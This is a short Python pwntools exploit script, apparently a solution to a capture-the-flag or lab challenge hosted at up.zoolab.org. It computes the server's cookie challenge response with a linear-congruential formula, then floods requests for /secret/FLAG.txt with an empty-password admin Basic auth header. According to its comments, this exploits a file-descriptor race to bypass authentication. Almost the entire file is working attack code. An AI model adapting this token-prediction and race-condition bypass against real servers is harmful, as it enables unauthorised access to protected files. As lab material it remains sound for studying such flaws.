from base64 import b64encode

from pwn import process, remote

MAX_CONCURRENT = 1000
MAX_UNSIGNED_LONG = 0xFFFFFFFFFFFFFFFF


r = remote("up.zoolab.org", 10933)
# r = remote("localhost", 8080)
r.newline = b"\r\n"

# get challenge
r.sendline(b"GET /secret/FLAG.txt")
r.sendline()
r.recvuntil(b"Set-Cookie: challenge=")
challenge = int(r.recvuntil(b";", drop=True).decode())
r.recvline_startswith(b"Content-Length:")
r.recvline()

# solve challenge
test_challenge = challenge
test_challenge = (test_challenge * 6364136223846793005) 
test_challenge = test_challenge + 1
test_challenge = test_challenge >> 33

challenge = (challenge * 6364136223846793005) & MAX_UNSIGNED_LONG
challenge = (challenge + 1) & MAX_UNSIGNED_LONG
challenge = (challenge >> 33) & MAX_UNSIGNED_LONG

print(f"challenge: {challenge}")
print(f"test_challenge: {test_challenge}")

# use high frequency requests to make a fd error
# guess: fd error is caused by two close fd operations, when fd is closed, other thread can use this fd
# but the second fd close will cause error, make second thread's fd invalid
# note: 
# on local server, it only need keep getting FLAG.txt to make error happen
# but on zoolab.org, it need get /, get FLAG.txt or password.txt won't work
# IDK why
for _ in range(999):
    # r.sendline(b"GET /")
    # r.sendline()

    r.sendline(b"GET /secret/FLAG.txt")
    r.sendline(b"Authorization: Basic " + b64encode(b"admin:"))
    r.sendline(f"Cookie: response={challenge}".encode())
    r.sendline()

    msg = r.recvline_startswith(delims=b"FLAG", timeout=0.01).decode()
    if len(msg) > 0:
        break

print(msg)
r.close()